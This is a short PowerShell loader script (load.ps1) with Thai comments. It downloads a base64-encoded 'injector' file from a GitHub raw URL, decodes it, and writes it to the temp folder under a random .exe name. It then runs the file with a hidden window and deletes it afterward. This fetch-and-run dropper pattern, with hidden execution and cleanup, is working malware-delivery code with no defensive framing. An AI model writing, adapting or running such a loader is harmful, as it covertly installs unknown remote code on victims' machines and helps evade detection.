# load.ps1 (เวอร์ชันใหม่)
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/injector.b64"
$base64 = (iwr -UseBasicParsing $url).Content
$bytes = [Convert]::FromBase64String($base64)

# ใช้ชื่อไฟล์สุ่ม + นามสกุล .exe
$tempFile = "$env:TEMP\$([System.Guid]::NewGuid().ToString()).exe"
[IO.File]::WriteAllBytes($tempFile, $bytes)

Start-Process $tempFile -WindowStyle Hidden -Wait

# ลบไฟล์
Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
